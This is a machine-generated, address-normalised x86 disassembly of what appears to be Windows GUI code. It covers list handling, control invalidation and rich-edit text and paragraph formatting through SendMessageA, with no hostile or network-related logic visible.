mov ebx eax
test [ ebx + 0x275 ] 0x1
je r-xdata
mov edx esi
mov eax ebx
call sub_4794f8
mov eax ebx
call sub_477ac0
cmp esi eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x278 ]
call sub_4161fc
cmp eax 0xffffffff
je r-xdata
test esi esi
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_4794ac
pop esi
pop ebx
retn
mov edx eax
mov eax ebx
call sub_479484
jmp r-xdata
mov edx esi
mov eax ebx
call sub_477b08
cmp [ esi + 0x24 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
sub_4791c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x284 ] 0x0
jne r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
test [ ebp - 0x5 ] 0x8
je r-xdata
xor edx edx
push ebp
push sub_479398
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x284 ] 0x1
test [ ebp - 0x5 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x274 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x280 ] edx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4794f8
test esi esi
je r-xdata
test [ ebp - 0x5 ] 0x1
je r-xdata
test [ ebp - 0x5 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x280 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
mov edx esi
call sub_4161fc
inc eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_479118
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x280 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4794f8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
xor edx edx
call sub_4161a0
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4797ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x284 ] 0x0
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x280 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_4769b4
mov ebx eax
mov eax ebx
call sub_476218
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4793b4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x280 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
mov edx esi
call sub_416340
xor ecx ecx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4794ac
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_475dc0
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_475dc0
cmp ebx eax
jl r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_475c24
mov ebx eax
test [ ebp - 0x5 ] 0x4
je r-xdata
mov al 0x1
mov eax ebx
call sub_475b30
test al al
je r-xdata
push 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_479570
jmp r-xdata
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_47917c
jmp r-xdata
mov eax ebx
call sub_475c24
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x280 ] ebx
jmp r-xdata
sub_4793cc
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx eax
mov eax [ ebx + 0x278 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_4793b4
mov ecx esp
xor edx edx
call sub_476248
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_448484
push eax
call InvalidateRect
inc edi
dec esi
jne r-xdata
sub_479418
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov edi [ ebp + 0xc ]
test bl bl
jne r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_443348
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
cmp [ esi + 0x285 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_477908
test al 0x8
je r-xdata
mov [ esi + 0x285 ] 0x0
jmp r-xdata
mov eax esi
call sub_4797ec
mov eax esi
call sub_477ac0
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax esi
call sub_4791c0
jmp r-xdata
sub_479484
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4793b4
xor edx edx
call sub_475a4c
mov edx esi
mov eax [ ebx + 0x278 ]
call sub_416090
pop esi
pop ebx
retn
sub_4794ac
push ebx
mov ebx edx
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov edx ecx
mov eax [ eax + 0x278 ]
mov ecx ebx
call sub_41621c
mov dl 0x1
mov eax ebx
call sub_475a4c
sub_4794d4
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov cl [ r-xdata ]
or cl [ esp ]
mov edx esi
mov eax ebx
call sub_4791c0
pop edx
pop esi
pop ebx
retn
sub_4794f8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x278 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax esi
call sub_477ac0
cmp edi eax
je r-xdata
mov edx ebx
mov eax esi
call sub_4793b4
cmp edi eax
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax esi
call sub_479484
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_477b08
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax [ esi + 0x278 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor ecx ecx
mov edx edi
mov eax esi
call sub_4794ac
sub_479570
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4794f8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
test [ ebx + 0x275 ] 0x2
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_479735
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x280 ]
cmp esi [ ebp - 0x4 ]
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
test esi esi
je r-xdata
push 0x0
mov edx [ ebx + 0x278 ]
mov cl 0x4
mov eax [ ebp - 0xc ]
call sub_416410
mov eax [ ebp - 0xc ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0xc ]
push eax
mov edx [ ebx + 0x278 ]
mov cl 0x4
mov eax [ ebp - 0x10 ]
call sub_416410
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov edx esi
mov eax [ ebp - 0xc ]
call sub_416044
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebx + 0x278 ]
mov edx [ ebp - 0x4 ]
call sub_4161fc
mov esi eax
test esi esi
jle r-xdata
inc edi
xor esi esi
mov eax [ ebx + 0x278 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
test [ ebx + 0x275 ] 0x4
je r-xdata
test [ ebx + 0x275 ] 0x4
je r-xdata
inc esi
jne r-xdata
mov eax [ ebx + 0x278 ]
mov edx esi
call sub_416090
mov eax [ ebx + 0x278 ]
mov ecx [ ebp - 0x4 ]
xor edx edx
call sub_41621c
jmp r-xdata
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4161a0
mov edx eax
xor ecx ecx
mov eax ebx
call sub_4794ac
inc esi
dec edi
jne r-xdata
mov eax [ ebx + 0x278 ]
mov edx esi
call sub_4161a0
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_4161fc
inc eax
je r-xdata
mov eax esi
call sub_475d18
mov esi eax
mov eax esi
call sub_475c24
mov esi eax
jmp r-xdata
mov eax esi
call sub_475d90
mov esi eax
jmp r-xdata
mov eax esi
call sub_475c68
mov esi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4036c0
mov eax [ ebp - 0xc ]
call sub_4036c0
retn
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4794ac
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_479484
test esi esi
jne r-xdata
mov edx esi
mov eax [ ebp - 0xc ]
call sub_416044
jmp r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
sub_479750
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_4797df
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x274 ] 0x0
jne r-xdata
test esi esi
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4797e6
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x278 ]
call sub_4161fc
inc eax
jne r-xdata
test bl bl
je r-xdata
mov ecx 0x1
mov edx esi
mov eax edi
call sub_4794ac
mov eax edi
call sub_4797ec
sub_4797ec
push ebx
push esi
push edi
push ebp
mov ebx eax
mov eax [ ebx + 0x278 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4793b4
mov ebp eax
mov eax [ ebx + 0x278 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax ebx
call sub_4793b4
mov edi eax
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_479484
jmp r-xdata
test esi esi
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ ebx + 0x275 ] 0x4
je r-xdata
cmp [ ebx + 0x274 ] 0x0
je r-xdata
test [ ebx + 0x275 ] 0x8
je r-xdata
mov eax edi
call sub_476218
test al al
je r-xdata
mov eax edi
call sub_4759a4
test al al
jne r-xdata
mov eax edi
call sub_475b70
push eax
mov eax ebp
call sub_475b70
pop edx
cmp edx eax
je r-xdata
mov dl 0x1
mov eax edi
call sub_475a4c
sub_479898
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_479902
push [ fs : edx ]
mov [ fs : edx ] esp
test esi esi
jl r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479909
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
inc esi
add ebx 0x4
dec esi
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_416044
mov eax [ ebx ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
sub_479910
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_479a85
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xf4 ]
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov edx ebx
mov eax esi
call sub_4161a0
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4797ec
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x278 ]
mov cl 0x4
mov eax [ ebp - 0xc ]
call sub_416410
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor edx edx
mov eax esi
call sub_4161a0
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_477ac0
cmp ebx eax
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax esi
call sub_416090
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
push eax
mov cl 0x4
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_416410
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor edx edx
mov eax esi
call sub_4161a0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_477b08
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
xor ecx ecx
mov edx esi
call sub_416410
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4036c0
mov eax [ ebp - 0x8 ]
call sub_4036c0
retn
inc edi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
mov edx ebx
call sub_4161a0
mov edx eax
mov eax [ ebp - 0xc ]
call sub_4161fc
inc eax
je r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4161a0
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_4794ac
inc ebx
dec edi
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479484
sub_479a9c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x278 ]
call sub_4161fc
inc eax
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_479118
sub_479ac0
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
test ebx ebx
setne al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4161fc
inc eax
jne r-xdata
mov eax ebx
call sub_475b70
mov ebx eax
test ebx ebx
jne r-xdata
sub_479af0
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov eax esi
call sub_475bac
mov ebx eax
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_479ac0
pop ecx
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_475be8
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_475bac
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_479ac0
pop ecx
test al al
je r-xdata
mov eax ebx
call sub_475be8
mov ebx eax
test ebx ebx
jne r-xdata
sub_479b58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_479bd2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_479be4
mov ebx eax
mov [ ebp - 0x8 ] ebx
jmp r-xdata
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479bd9
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
mov eax ebx
call sub_4759a4
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_479af0
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax ebx
call sub_475b70
mov ebx eax
mov [ ebp - 0x8 ] ebx
sub_479be4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax edi
call sub_4793a8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_477ac0
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4793b4
mov edx eax
mov eax ebp
call sub_416044
inc esi
dec ebx
jne r-xdata
sub_479c28
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403690
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x8 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_479c8c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_479c70
mov eax [ ebx + 0x4 ]
call sub_448788
test al al
je r-xdata
pop esi
pop ebx
retn
push esi
cmp [ ebx + 0x8 ] 0x0
sete al
and eax 0x7f
push eax
push 0x43a
mov eax [ ebx + 0x4 ]
call sub_448484
push eax
call SendMessageA
sub_479ccc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
xor esi esi
mov esi 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
push 0x444
mov eax [ ebx + 0x4 ]
call sub_448484
push eax
call SendMessageA
mov eax [ ebx + 0x4 ]
call sub_448788
test al al
je r-xdata
sub_479d1c
push ebx
push esi
add esp 0xffffffc4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_479c70
mov [ esp + 0x4 ] 0x8000000
mov [ esp + 0x18 ] bl
mov edx esp
mov eax esi
call sub_479ccc
add esp 0x3c
pop esi
pop ebx
retn
sub_479d6c
push ebx
push esi
add esp 0xffffffc4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_479c70
mov [ esp + 0x4 ] 0x40000000
cmp esi 0x80000008
jne r-xdata
mov eax esi
call sub_421054
mov [ esp + 0x14 ] eax
mov [ esp + 0x8 ] 0x40000000
jmp r-xdata
mov edx esp
mov eax ebx
call sub_479ccc
add esp 0x3c
pop esi
pop ebx
retn
sub_479dd8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4048cc
xor eax eax
push ebp
push sub_479e3b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_479c70
mov [ ebp - 0x3c ] 0x20000000
lea eax [ ebp - 0x26 ]
mov ecx 0x1f
mov edx [ ebp - 0x4 ]
call sub_409078
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_479ccc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479e42
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_479e48
push ebx
push esi
add esp 0xffffffc4
mov bl [ r-xdata ]
mov edx esp
call sub_479c8c
mov esi [ esp + 0x8 ]
test esi 0x1
je r-xdata
test esi 0x2
je r-xdata
or bl 0x1
test esi 0x4
je r-xdata
or bl 0x2
test esi 0x8
je r-xdata
or bl 0x4
mov eax ebx
add esp 0x3c
pop esi
pop ebx
retn
or bl 0x8
sub_479e98
push ebx
add esp 0xffffffc0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_479c70
mov [ esp + 0x8 ] 0xf
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x2
je r-xdata
or [ esp + 0xc ] 0x1
test [ esp ] 0x4
je r-xdata
or [ esp + 0xc ] 0x2
test [ esp ] 0x8
je r-xdata
or [ esp + 0xc ] 0x4
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_479ccc
add esp 0x40
pop ebx
retn
or [ esp + 0xc ] 0x8
sub_479f0c
push ebx
push esi
add esp 0xffffffc4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_479c70
mov [ esp + 0x4 ] 0x80000000
mov eax esi
shl eax 0x2
lea eax [ eax + eax * 4 ]
mov [ esp + 0xc ] eax
mov edx esp
mov eax ebx
call sub_479ccc
add esp 0x3c
pop esi
pop ebx
retn
sub_479f44
add esp 0xffffffc4
mov edx esp
call sub_479c8c
mov al [ esp + 0x19 ]
and al 0x3
sub al 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
add esp 0x3c
retn
mov al 0x2
jmp r-xdata
dec al
je r-xdata
mov al 0x1
jmp r-xdata
jmp r-xdata
xor eax eax
sub_479f74
push ebx
push esi
add esp 0xffffffc4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_479c70
dec bl
je r-xdata
mov [ esp + 0x19 ] 0x2
jmp r-xdata
dec bl
je r-xdata
mov edx esp
mov eax esi
call sub_479ccc
add esp 0x3c
pop esi
pop ebx
retn
mov [ esp + 0x19 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ esp + 0x19 ] 0x0
sub_479fb4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_47a0e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edi ebx
mov edx [ edi + 0x18 ]
mov eax esi
call sub_479d6c
lea edx [ ebp - 0x4 ]
mov eax edi
call sub_421724
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_479dd8
mov eax edi
call sub_42183c
mov edx eax
mov eax esi
call sub_479d1c
mov eax edi
call sub_4217d4
mov edx eax
mov eax esi
call sub_479e98
mov eax edi
call sub_421798
mov edx eax
mov eax esi
call sub_479f0c
mov eax edi
call sub_42180c
mov edx eax
mov eax esi
call sub_479f74
jmp r-xdata
mov edx ebx
mov eax esi
call sub_416a84
mov edi ebx
mov eax edi
call sub_479d4c
mov edx eax
mov eax esi
call sub_479d6c
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_479db4
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_479dd8
mov eax edi
call sub_479d08
mov edx eax
mov eax esi
call sub_479d1c
mov eax edi
call sub_479e48
mov edx eax
mov eax esi
call sub_479e98
mov eax edi
call sub_479f44
mov edx eax
mov eax esi
call sub_479f74
mov eax edi
call sub_479ef0
mov edx eax
mov eax esi
call sub_479f0c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a0ea
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
sub_47a0f4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_47a216
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax esi
call sub_479d4c
mov edx eax
mov edi ebx
mov eax edi
call sub_421514
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_479db4
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_42173c
mov eax esi
call sub_479d08
mov edx eax
mov eax edi
call sub_421844
mov eax esi
call sub_479e48
mov edx eax
mov eax edi
call sub_4217e0
mov eax esi
call sub_479ef0
mov edx eax
mov eax edi
call sub_4217b4
mov eax esi
call sub_479f44
mov edx eax
mov eax edi
call sub_421814
jmp r-xdata
mov edx ebx
mov eax esi
call sub_416b68
mov eax esi
call sub_479d4c
mov edx eax
mov edi ebx
mov eax edi
call sub_479d6c
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_479db4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_479dd8
mov eax esi
call sub_479d08
mov edx eax
mov eax edi
call sub_479d1c
mov eax esi
call sub_479e48
mov edx eax
mov eax edi
call sub_479e98
mov eax esi
call sub_479f44
mov edx eax
mov eax edi
call sub_479f74
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a21d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
sub_47a224
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403690
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_47a27c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47a260
mov eax [ ebx + 0x4 ]
call sub_448788
test al al
je r-xdata
pop esi
pop ebx
retn
push esi
push 0x0
push 0x43d
mov eax [ ebx + 0x4 ]
call sub_448484
push eax
call SendMessageA
sub_47a2b0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_448460
mov eax [ ebx + 0x4 ]
call sub_448788
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov si 0xffc8
call sub_4038bc
test al al
je r-xdata
push edi
push 0x0
push 0x447
mov eax [ ebx + 0x4 ]
call sub_448484
push eax
call SendMessageA
mov ax [ edi + 0x18 ]
cmp ax 0x1
jne r-xdata
cmp ax 0x2
jne r-xdata
mov [ edi + 0x18 ] 0x2
jmp r-xdata
mov [ edi + 0x18 ] 0x1
sub_47a330
push ebx
push esi
add esp 0xffffff64
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_47a260
mov [ esp + 0x4 ] 0x8
xor eax eax
mov al bl
inc eax
mov [ esp + 0x18 ] ax
mov edx esp
mov eax esi
call sub_47a2b0
add esp 0x9c
pop esi
pop ebx
retn
sub_47a384
push ebx
push esi
add esp 0xffffff64
mov ebx edx
mov esi eax
mov eax ebx
sub al 0x1
jb r-xdata
xor edx edx
mov eax esi
call sub_47a464
jne r-xdata
mov edx esp
mov eax esi
call sub_47a260
mov [ esp + 0x4 ] 0x20
xor eax eax
mov al bl
mov [ esp + 0x8 ] ax
mov edx esp
mov eax esi
call sub_47a2b0
add esp 0x9c
pop esi
pop ebx
retn
mov eax esi
call sub_47a444
cmp eax 0xa
jge r-xdata
mov edx 0xa
mov eax esi
call sub_47a464
jmp r-xdata
sub_47a408
push ebx
push esi
add esp 0xffffff64
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_47a260
mov [ esp + 0x4 ] 0x1
mov eax esi
shl eax 0x2
lea eax [ eax + eax * 4 ]
mov [ esp + 0xc ] eax
mov edx esp
mov eax ebx
call sub_47a2b0
add esp 0x9c
pop esi
pop ebx
retn
sub_47a464
push ebx
push esi
add esp 0xffffff64
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_47a260
mov [ esp + 0x4 ] 0x4
mov eax esi
shl eax 0x2
lea eax [ eax + eax * 4 ]
mov [ esp + 0x14 ] eax
mov edx esp
mov eax ebx
call sub_47a2b0
add esp 0x9c
pop esi
pop ebx
retn
sub_47a4c0
push ebx
push esi
add esp 0xffffff64
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_47a260
mov [ esp + 0x4 ] 0x2
mov eax esi
shl eax 0x2
lea eax [ eax + eax * 4 ]
mov [ esp + 0x10 ] eax
mov edx esp
mov eax ebx
call sub_47a2b0
add esp 0x9c
pop esi
pop ebx
retn
sub_47a4fc
push ebx
add esp 0xffffff64
mov ebx edx
mov edx esp
call sub_47a27c
xor eax eax
mov al bl
mov eax [ esp + eax * 4 + 0x1c ]
mov ecx 0x14
cdq
idiv ecx
add esp 0x9c
pop ebx
retn
sub_47a524
push ebx
